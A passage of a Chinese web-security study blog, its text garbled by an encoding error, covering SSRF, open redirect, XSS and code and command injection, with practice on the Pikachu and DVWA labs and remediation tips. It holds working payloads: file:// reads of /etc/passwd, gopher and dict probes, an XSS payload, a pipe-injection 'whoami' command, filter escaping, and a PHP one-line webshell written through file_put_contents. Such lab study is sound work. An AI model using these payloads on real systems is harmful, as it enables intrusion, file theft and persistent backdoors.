é™¤ï¼Œæœ‰äº¤äº’ä¸ªæ•°æ®ä¼ è¾“çš„åœ°æ–¹å°±å¯èƒ½å­˜åœ¨csrfï¼Œä½†æ˜¯æŒ–æ˜æ˜¯æœ€å¥½é€šè¿‡åˆ¤æ–­æœ‰æ— äºŒæ¬¡éªŒè¯æˆ–è€…é€šè¿‡æœ‰æ— tokenç­‰æ¥å¿«é€Ÿåˆ¤æ–­</p><h5 id="ä¿®å¤æ–¹æ³•ï¼š"><a href="#ä¿®å¤æ–¹æ³•ï¼š" class="headerlink" title="ä¿®å¤æ–¹æ³•ï¼š"></a>ä¿®å¤æ–¹æ³•ï¼š</h5><p>è¿›è¡Œä¸€ä¸ªé‡æ–°èº«ä»½éªŒè¯</p><ul><li><h3 id="SSRFæ¼æ´"><a href="#SSRFæ¼æ´" class="headerlink" title="SSRFæ¼æ´"></a><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">SSRFæ¼æ´</a></h3></li></ul><p><a href="https://www.ajsafe.com/news/181.html" target="_blank" rel="noopener">SSRFâ€”â€”æ¼æ´åˆ©ç”¨</a></p><h4 id="ä»€ä¹ˆæ˜¯ssrfï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ssrfï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ssrfï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ssrfï¼Ÿ</h4><p>æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ä¸­ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·çš„è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œssrfæ˜¯é’ˆå¯¹ç›®æ ‡ç½‘ç«™çš„å†…éƒ¨ç³»ç»Ÿã€‚å› ä¸ºä»–æ˜¯ä»å†…éƒ¨ç³»ç»Ÿè®¿é—®çš„ï¼Œæ‰€æœ‰å¯ä»¥é€šå¯Œå“¦å®ƒæ”»å‡»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿï¼Œä¹Ÿå°±æ˜¯æŠŠç›®æ ‡ç½‘ç«™å½“ä¸­é—´äººã€‚</p><h4 id="æ¼æ´æˆå› ï¼š"><a href="#æ¼æ´æˆå› ï¼š" class="headerlink" title="æ¼æ´æˆå› ï¼š"></a>æ¼æ´æˆå› ï¼š</h4><p>ssrfå½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›ä»å…¶ä»–æœåŠ¡å™¨è¤ç«è·å–çš„æ•°æ®çš„åŠŸèƒ½ï¼Œä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®šçš„URLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œæ–‡æ¡£ï¼Œç­‰ã€‚</p><h4 id="æ¼æ´åˆ©ç”¨ï¼š"><a href="#æ¼æ´åˆ©ç”¨ï¼š" class="headerlink" title="æ¼æ´åˆ©ç”¨ï¼š"></a>æ¼æ´åˆ©ç”¨ï¼š</h4><p>å†…å¤–ç½‘çš„ç«¯å£å’ŒæœåŠ¡æ‰«æ</p><p>ä¸»æœºæœ¬åœ°å…è‚æ•°æ®çš„è¯»å–</p><p>å†…å¤–ç½‘ä¸»æœºåº”ç”¨ç¨‹åºæ¼æ´çš„åˆ©ç”¨</p><p>å†…å¤–ç½‘webç«™ç‚¹æ¼æ´çš„åˆ©ç”¨</p><h4 id="æ¼æ´å±å®³ï¼š"><a href="#æ¼æ´å±å®³ï¼š" class="headerlink" title="æ¼æ´å±å®³ï¼š"></a>æ¼æ´å±å®³ï¼š</h4><p>æ¢æµ‹å†…ç½‘æœåŠ¡ä»¥åŠå†…ç½‘æ‹“æ‰‘</p><p>å‘å†…éƒ¨ä»»æ„ä¸»æœºçš„ä»»æ„ç«¯å£å‘é€ç²¾å¿ƒæ„é€ çš„payload</p><p>doså†¬å­£</p><p>æ”»å‡»å†…ç½‘çš„webåº”ç”¨ï¼Œå¦‚xssã€sqlæ³¨å…¥ç­‰</p><p>åˆ©ç”¨fileã€dictã€gopherç­‰åè®®è¯»å–æ–‡æœ¬ä¿¡æ¯</p><h4 id="å¸¸ç”¨åè®®ï¼š"><a href="#å¸¸ç”¨åè®®ï¼š" class="headerlink" title="å¸¸ç”¨åè®®ï¼š"></a>å¸¸ç”¨åè®®ï¼š</h4><p>fileåè®®å¯ç”¨äºæŸ¥çœ‹æ–‡ä»¶</p><p>dictå¯ç”¨äºåˆºæ¢ç«¯å£</p><p>gopheråè®®æ”¯æŒget/postç­‰è¯·æ±‚ï¼Œå¯ç”¨äºæ”»å‡»å†…ç½‘ftpã€redisã€telnetã€smtpç­‰æœåŠ¡</p><h4 id="fileåè®®-æœ¬åœ°æ–‡ä»¶ä¼ è¾“åè®®-çš„è¿ç”¨ï¼š"><a href="#fileåè®®-æœ¬åœ°æ–‡ä»¶ä¼ è¾“åè®®-çš„è¿ç”¨ï¼š" class="headerlink" title="fileåè®®(æœ¬åœ°æ–‡ä»¶ä¼ è¾“åè®®)çš„è¿ç”¨ï¼š"></a>fileåè®®(æœ¬åœ°æ–‡ä»¶ä¼ è¾“åè®®)çš„è¿ç”¨ï¼š</h4><pre><code>?url=file:///etc/passwd</code></pre><h4 id="gopheråè®®è¿ç”¨ï¼š"><a href="#gopheråè®®è¿ç”¨ï¼š" class="headerlink" title="gopheråè®®è¿ç”¨ï¼š"></a>gopheråè®®è¿ç”¨ï¼š</h4><pre><code>?url=gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code></pre><p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470" target="_blank" rel="noopener">SSRFåˆ©ç”¨ Gopher åè®®æ‹“å±•æ”»å‡»é¢</a></p><h4 id="dictåè®®åº”ç”¨ï¼š"><a href="#dictåè®®åº”ç”¨ï¼š" class="headerlink" title="dictåè®®åº”ç”¨ï¼š"></a><a href="https://blog.csdn.net/weixin_35678674/article/details/114470729" target="_blank" rel="noopener">dictåè®®åº”ç”¨ï¼š</a></h4><pre><code>?url=dict://serverip:port/å‘½ä»¤:å‚æ•°</code></pre><p>å¯ä»¥é’ˆå¯¹ç«¯å£å¤„ï¼Œè®¾ç½®å‚æ•°ï¼Œåˆ©ç”¨å¸¸ç”¨ç«¯å£çš„å­—å…¸æ¥è¿›è¡Œçˆ†ç ´ç«¯å£æŸ¥çœ‹</p><h4 id="pikachué¶åœºç»ƒä¹ ï¼š"><a href="#pikachué¶åœºç»ƒä¹ ï¼š" class="headerlink" title="pikachué¶åœºç»ƒä¹ ï¼š"></a>pikachué¶åœºç»ƒä¹ ï¼š</h4><p><strong>PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:</strong><br><strong>file_get_contents()</strong><br><strong>fsockopen()</strong><br><strong>curl_exec()</strong></p><p>çŸ¥è¯†è¡¥å……ï¼š<a href="https://blog.csdn.net/deliciousion/article/details/78062521" target="_blank" rel="noopener">å¼ºå¤§çš„curlå‘½ä»¤çš„ä»‹ç»å’Œä¸€èˆ¬ç”¨æ³•</a></p><pre><code>?url=file:///E:\phpstudy\PHPTutorial\WWW\pikachu-master/123.txt</code></pre><p>åˆ©ç”¨file://æ¥è¯»å–123.txtçš„å†…å®¹</p><pre><code>?url=dict://127.0.0.1:3306</code></pre><p>æ¥è¯»å–æœ¬åœ°3306ç«¯å£çš„ä¿¡æ¯</p><h4 id="æ¼æ´æŒ–æ˜ï¼š"><a href="#æ¼æ´æŒ–æ˜ï¼š" class="headerlink" title="æ¼æ´æŒ–æ˜ï¼š"></a><a href="https://blog.csdn.net/u010726042/article/details/77806775" target="_blank" rel="noopener">æ¼æ´æŒ–æ˜ï¼š</a></h4><p>åˆ†äº«ï¼šé€šè¿‡URLåœ°å€åˆ†äº«ç½‘é¡µå†…å®¹</p><p>è½¬ç æœåŠ¡</p><p>åœ¨çº¿ç¿»è¯‘</p><p>å›¾ç‰‡çš„åŠ è½½ä¸ä¸‹è½½ï¼šé€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</p><p>å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½</p><p>æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–è°ƒç”¨URLçš„åŠŸèƒ½</p><p>ä»URLå…³é”®å­—ä¸­å¯»æ‰¾</p><h4 id="ä¿®å¤æ–¹æ³•ï¼š-1"><a href="#ä¿®å¤æ–¹æ³•ï¼š-1" class="headerlink" title="ä¿®å¤æ–¹æ³•ï¼š"></a>ä¿®å¤æ–¹æ³•ï¼š</h4><p>ç¦ç”¨ä¸éœ€è¦çš„åè®®</p><p>é»‘åå•å†…ç½‘ip</p><p>é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºHTTPå¸¸ç”¨çš„ç«¯å£ï¼š80ã€443ã€8080ã€8090</p><p>è¿‡æ»¤è¿”å›ä¿¡æ¯</p><p>ç»Ÿä¸€é”™è¯¯ä¿¡æ¯</p><ul><li><h3 id="URLè·³è½¬"><a href="#URLè·³è½¬" class="headerlink" title="URLè·³è½¬"></a><a href="https://blog.csdn.net/pro20/article/details/105731095" target="_blank" rel="noopener">URLè·³è½¬</a></h3></li></ul><p>æŒ‡åå°æœåŠ¡å™¨åœ¨å‘ŠçŸ¥æµè§ˆå™¨è·³è½¬æ—¶ï¼Œæœªå¯¹å®¢æˆ·ç«¯ä¼ å…¥çš„é‡å®šå‘åœ°å€è¿›è¡Œåˆæ³•æ€§æ ¡éªŒï¼Œå¯¼è‡´ç”¨æˆ·æµè§ˆå™¨è·³è½¬åˆ°é’“é±¼é¡µé¢çš„ä¸€ä¸­æ¼æ´</p><h4 id="è·³è½¬å®ç°æ–¹å¼"><a href="#è·³è½¬å®ç°æ–¹å¼" class="headerlink" title="è·³è½¬å®ç°æ–¹å¼"></a><strong>è·³è½¬å®ç°æ–¹å¼</strong></h4><pre><code>1.METAæ ‡ç­¾å†…è·³è½¬2.javascriptè·³è½¬3.headerè·³è½¬</code></pre><h5 id="metaï¼š"><a href="#metaï¼š" class="headerlink" title="metaï¼š"></a>metaï¼š</h5><pre><code>&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;5; url=&lt;?php echo $url?&gt;&quot; /&gt;</code></pre><h5 id="jsè·³è½¬æºç ï¼š"><a href="#jsè·³è½¬æºç ï¼š" class="headerlink" title="jsè·³è½¬æºç ï¼š"></a>jsè·³è½¬æºç ï¼š</h5><h5 id="headerè·³è½¬æºç ï¼š"><a href="#headerè·³è½¬æºç ï¼š" class="headerlink" title="headerè·³è½¬æºç ï¼š"></a>headerè·³è½¬æºç ï¼š</h5><pre><code>header(&quot;Location:$url&quot;)</code></pre><h4 id="æ¼æ´å±å®³ï¼š-1"><a href="#æ¼æ´å±å®³ï¼š-1" class="headerlink" title="æ¼æ´å±å®³ï¼š"></a>æ¼æ´å±å®³ï¼š</h4><p>é’“é±¼ï¼šåˆ©ç”¨æºç å°å·åˆ¶ä½œé’“é±¼ç½‘ç«™</p><p>é…åˆcsrf</p><p>é…åˆxssæ¼æ´</p><h4 id="pikachué¶åœºç»ƒä¹ ï¼š-1"><a href="#pikachué¶åœºç»ƒä¹ ï¼š-1" class="headerlink" title="pikachué¶åœºç»ƒä¹ ï¼š"></a>pikachué¶åœºç»ƒä¹ ï¼š</h4><p>è¿˜å¾—æ˜¯è‡ªä¸»å­¦ä¹ ï¼</p><ul><li><h3 id="xssæ¼æ´"><a href="#xssæ¼æ´" class="headerlink" title="xssæ¼æ´"></a>xssæ¼æ´</h3></li></ul><p><a href="https://blog.csdn.net/weixin_42277564/article/details/100140894" target="_blank" rel="noopener">XSSè¯­å¥</a></p><p><a href="https://blog.csdn.net/weixin_30845171/article/details/98501929" target="_blank" rel="noopener">XSS æ¼æ´åŸç†åŠé˜²å¾¡æ–¹æ³•</a></p><h4 id="â†“â†“â†“â†“æ­å»ºdvwaå¹¶æ¼”ç»ƒâ†“â†“â†“â†“"><a href="#â†“â†“â†“â†“æ­å»ºdvwaå¹¶æ¼”ç»ƒâ†“â†“â†“â†“" class="headerlink" title="â†“â†“â†“â†“æ­å»ºdvwaå¹¶æ¼”ç»ƒâ†“â†“â†“â†“"></a>â†“â†“â†“â†“æ­å»ºdvwaå¹¶æ¼”ç»ƒâ†“â†“â†“â†“</h4><h4 id="åå°„å‹ï¼š"><a href="#åå°„å‹ï¼š" class="headerlink" title="åå°„å‹ï¼š"></a>åå°„å‹ï¼š</h4><p>lowï¼š</p><pre><code>&lt;img src=x onerror=alert(1);&gt;</code></pre><h4 id="å­˜å‚¨å‹ï¼š"><a href="#å­˜å‚¨å‹ï¼š" class="headerlink" title="å­˜å‚¨å‹ï¼š"></a>å­˜å‚¨å‹ï¼š</h4><p>lowï¼šæ²¡æ„æ€</p><h4 id="Domå‹ï¼š"><a href="#Domå‹ï¼š" class="headerlink" title="Domå‹ï¼š"></a>Domå‹ï¼š</h4><p>åœ¨URLæ åé¢æ³¨å…¥ä¸€ä¸ªæ ‡ç­¾</p><h4 id="XSSè¿›é˜¶åˆ©ç”¨ï¼š"><a href="#XSSè¿›é˜¶åˆ©ç”¨ï¼š" class="headerlink" title="XSSè¿›é˜¶åˆ©ç”¨ï¼š"></a>XSSè¿›é˜¶åˆ©ç”¨ï¼š</h4><p><strong>BeFFåŸç†ï¼š</strong>zombieï¼ˆåƒµå°¸ï¼‰å³å—å®³çš„æµè§ˆå™¨ã€‚zombieæ˜¯è¢«hookï¼ˆå‹¾è¿ï¼‰çš„ï¼Œå¦‚æœæµè§ˆå™¨è®¿é—®äº†æœ‰å‹¾å­ï¼ˆç”±jsç¼–å†™ï¼‰çš„é¡µé¢ï¼Œå°±ä¼šè¢«hookï¼Œå‹¾è¿çš„æµè§ˆå™¨ä¼šæ‰§è¡Œåˆå§‹ä»£ç è¿”å›ä¸€äº›ä¿¡æ¯ï¼Œæ¥ç€zombieä¼šæ¯éš”ä¸€æ®µæ—¶é—´ï¼ˆé»˜è®¤ä¸º1ç§’ï¼‰å°±ä¼šå‘BeEFæœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œè¯¢é—®æ˜¯å¦æœ‰æ–°çš„ä»£ç éœ€è¦æ‰§è¡Œã€‚BeEFæœåŠ¡å™¨æœ¬è´¨ä¸Šå°±åƒä¸€ä¸ªWebåº”ç”¨ï¼Œè¢«åˆ†ä¸ºå‰ç«¯UIï¼Œ    å’Œåç«¯ã€‚å‰ç«¯ä¼šè½®è¯¢åç«¯æ˜¯å¦æœ‰æ–°çš„æ•°æ®éœ€è¦æ›´æ–°ï¼ŒåŒæ—¶å‰ç«¯ä¹Ÿå¯ä»¥å‘åç«¯å‘é€æŒ‡ç¤ºï¼Œ BeEFæŒæœ‰è€…å¯ä»¥é€šè¿‡æµè§ˆå™¨æ¥ç™»å½•BeEF  çš„åå°ç®¡ç†UIã€‚</p><p><a href="https://www.freebuf.com/articles/web/175755.html" target="_blank" rel="noopener"><strong>BeFFé»˜è®¤è®¾ç½®æœªåŒmetasploitå…³è”ï¼Œæ— æ³•ä½¿ç”¨msfæ¨¡å—ï¼Œå› æ­¤éœ€è¦é…ç½®æ¥è¿æ¥msf</strong></a></p><p>è¿™ä¸ªæœåŠ¡æå…¶NBï¼ï¼ï¼</p><p><a href="https://www.pianshen.com/article/42831378513/" target="_blank" rel="noopener">BeEF-XSSè¯¦ç»†ä½¿ç”¨æ•™ç¨‹</a></p><h4 id="æ¼æ´æŒ–æ˜ï¼š-1"><a href="#æ¼æ´æŒ–æ˜ï¼š-1" class="headerlink" title="æ¼æ´æŒ–æ˜ï¼š"></a>æ¼æ´æŒ–æ˜ï¼š</h4><p>è§æ¡†å°±æ’ï¼š</p><p>æœç´¢æ¡†ã€URLåœ°å€æ ã€ç•™è¨€æ¿ã€ç™»é™†å¤„ã€å„ç§æœ‰è¾“å…¥è¾“å‡ºç‚¹çš„åœ°æ–¹</p><h4 id="æ¼æ´ä¿®å¤ï¼š"><a href="#æ¼æ´ä¿®å¤ï¼š" class="headerlink" title="æ¼æ´ä¿®å¤ï¼š"></a>æ¼æ´ä¿®å¤ï¼š</h4><p>ç™½åå•</p><p>è¾“å‡ºæ£€æŸ¥</p><p>HTTPonlyï¼šæµè§ˆå™¨è¿›åˆ¶é¡µé¢çš„javascriptè®¿é—®å¸¦å“¦æœ‰HTTPonlyå±æ€§çš„cookieã€‚HTTPonlyè§£å†³çš„æ˜¯xssåçš„cookieåŠ«æŒæ”»å‡»</p><ul><li><h3 id="ä»£ç æ³¨å…¥ä¸å‘½ä»¤æ³¨å…¥"><a href="#ä»£ç æ³¨å…¥ä¸å‘½ä»¤æ³¨å…¥" class="headerlink" title="ä»£ç æ³¨å…¥ä¸å‘½ä»¤æ³¨å…¥"></a>ä»£ç æ³¨å…¥ä¸å‘½ä»¤æ³¨å…¥</h3></li></ul><h4 id="ä»£ç æ‰§è¡Œæ¼æ´ä»¥åŠåˆ©ç”¨"><a href="#ä»£ç æ‰§è¡Œæ¼æ´ä»¥åŠåˆ©ç”¨" class="headerlink" title="ä»£ç æ‰§è¡Œæ¼æ´ä»¥åŠåˆ©ç”¨"></a>ä»£ç æ‰§è¡Œæ¼æ´ä»¥åŠåˆ©ç”¨</h4><p><a href="https://www.jianshu.com/p/4aa5c0448e30" target="_blank" rel="noopener">ä»£ç æ‰§è¡Œæ¼æ´ç›¸å…³å‡½æ•°</a></p><h5 id="é™æ€å‡½æ•°æ‰§è¡Œï¼š"><a href="#é™æ€å‡½æ•°æ‰§è¡Œï¼š" class="headerlink" title="é™æ€å‡½æ•°æ‰§è¡Œï¼š"></a>é™æ€å‡½æ•°æ‰§è¡Œï¼š</h5><p><a href="https://www.runoob.com/php/func-misc-eval.html" target="_blank" rel="noopener">eval()å‡½æ•°</a>æŠŠå­—ç¬¦ä¸²å½“æˆ PHP ä»£ç æ¥è®¡ç®—</p><p><a href="https://www.runoob.com/w3cnote/c-assert.html" target="_blank" rel="noopener">assert()å‡½æ•°</a>ä¼šå®šæœŸæ£€æŸ¥æŒ‡å®šçš„æ–­è¨€å¹¶åœ¨ç»“æœä¸ºfalseæ—¶é‡‡å–é€‚å½“çš„è¡ŒåŠ¨</p><p>assert(â€˜phpinfo();â€™);</p><p>eval(â€˜phpinfo();â€™);</p><h5 id="åŠ¨æ€å‡½æ•°æ‰§è¡Œï¼š"><a href="#åŠ¨æ€å‡½æ•°æ‰§è¡Œï¼š" class="headerlink" title="åŠ¨æ€å‡½æ•°æ‰§è¡Œï¼š"></a>åŠ¨æ€å‡½æ•°æ‰§è¡Œï¼š</h5><pre><code>&lt;?php$name=$_GET[&#39;666&#39;];eval($name.&#39;;&#39;);</code></pre><h5 id="åˆ©ç”¨æ–¹å¼ï¼š"><a href="#åˆ©ç”¨æ–¹å¼ï¼š" class="headerlink" title="åˆ©ç”¨æ–¹å¼ï¼š"></a>åˆ©ç”¨æ–¹å¼ï¼š</h5><ul><li>è·å–ç»å¯¹è·¯å¾„ï¼š</li></ul><pre><code>__FILE__æ˜¯phpé¢„å®šä¹‰çš„å¸¸é‡ï¼Œå¯ä»¥ç”¨æ¥è¿‡å»å½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œ?code=print(__FILE__)</code></pre><ul><li>æ–‡ä»¶è¯»å–ï¼š</li></ul><p>file_get_contents()å‡½æ•°ç”¨æ¥è¯»å–æœåŠ¡å™¨æ–‡ä»¶ï¼Œï¼Ÿcode=var_dump(file_get_contents(â€˜$_POST[â€˜filename]â€™,â€™$_POST[code]â€™));</p><ul><li>å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼š</li></ul><p>ç”¨file_get_contents()å‡½æ•°å†™å…¥ä¸€å¥è¯æœ¨é©¬å‰ææ˜¯å¿…é¡»çŸ¥é“è·¯å¾„ï¼Œï¼Ÿcode=file_put_contents(â€˜c:\windows\win.iniâ€™);</p><p>ç„¶åå€ŸåŠ©hackbarå»æäº¤filename=shell.php&amp;code=<?php eval($_POST['x'];?>å€Ÿå£åœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€å¥è¯æœ¨é©¬ã€‚</p><h5 id="ä¿®å¤å»ºè®®ï¼š"><a href="#ä¿®å¤å»ºè®®ï¼š" class="headerlink" title="ä¿®å¤å»ºè®®ï¼š"></a>ä¿®å¤å»ºè®®ï¼š</h5><p>å‡çº§åˆ°PHP7.1</p><p>php.iniä¸­å…³é—­â€œallow_url_fopenâ€ã€‚åœ¨å®ƒæ‰“å¼€çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡pher://ç­‰åè®®ä¸¢ç»™includeï¼Œè®©å…¶æ‰§è¡ŒåŠ¨æ€ä»£ç ã€‚</p><p>æ°¸è¿œä¸è¦åœ¨ä»£ç ä¸­ä½¿ç”¨evalã€‚</p><p>ä¸¥æ ¼è¿›è¡Œè¿‡æ»¤ã€‚</p><h4 id="å‘½ä»¤æ‰§è¡Œæ¼æ´ä»¥åŠåˆ©ç”¨"><a href="#å‘½ä»¤æ‰§è¡Œæ¼æ´ä»¥åŠåˆ©ç”¨" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ¼æ´ä»¥åŠåˆ©ç”¨"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´ä»¥åŠåˆ©ç”¨</h4><h5 id="ç›¸å…³å‡½æ•°ï¼š"><a href="#ç›¸å…³å‡½æ•°ï¼š" class="headerlink" title="ç›¸å…³å‡½æ•°ï¼š"></a><a href="https://www.secpulse.com/archives/115318.html" target="_blank" rel="noopener">ç›¸å…³å‡½æ•°</a>ï¼š</h5><p>å®ä¾‹ï¼š</p><pre><code>&lt;?php$a=$_GET[&#39;ip&#39;];if($a){    system(&quot;ping -c 1 $a&quot;);}?&gt;</code></pre><p>payloadï¼š<a href="http://127.0.0.1/testphp/eval.php?ip=127.0.0.1|whoami" target="_blank" rel="noopener">http://127.0.0.1/testphp/eval.php?ip=127.0.0.1|whoami</a></p><p>å…¶ä¸­çš„åˆ©ç”¨ç®¡é“ç¬¦å·æ¥å®ç°åœ¨shellä¸­çš„å¤šé‡å‘½ä»¤æ‰§è¡Œ</p><h5 id="å‘½ä»¤æ‰§è¡Œç»•è¿‡ï¼š"><a href="#å‘½ä»¤æ‰§è¡Œç»•è¿‡ï¼š" class="headerlink" title="å‘½ä»¤æ‰§è¡Œç»•è¿‡ï¼š"></a><a href="http://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener">å‘½ä»¤æ‰§è¡Œç»•è¿‡ï¼š</a></h5><p>windowsï¼š</p><p>ç”¨^æ¥è½¬ä¹‰&lt;&gt;</p><p>linuxï¼š</p><p>ç”¨\æ¥è½¬ä¹‰&lt;&gt;</p><h4 id="dvwaé¶åœºå®æˆ˜ï¼š"><a href="#dvwaé¶åœºå®æˆ˜ï¼š" class="headerlink" title="dvwaé¶åœºå®æˆ˜ï¼š"></a>dvwaé¶åœºå®æˆ˜ï¼š</h4><p>impossibleçº§åˆ«æºç ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Check Anti-CSRF token</span>    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Split the IP into 4 octects</span>    <span class="token variable">$octet</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span> <span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Check IF each octet is an integer</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">sizeof</span><span class="token punctuation">(</span> <span class="token variable">$octet</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// If all 4 octets are int's put the IP back together.</span>        <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Determine OS and execute the ping command.</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Windows</span>            <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string">'ping  '</span> <span class="token punctuation">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// *nix</span>            <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string">'ping  -c 4 '</span> <span class="token punctuation">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Feedback for the end user</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>{$cmd}&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Ops. Let the user name theres a mistake</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;pre>ERROR: You have entered an invalid IP.&lt;/pre>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Generate Anti-CSRF token</span><span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><h3 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" 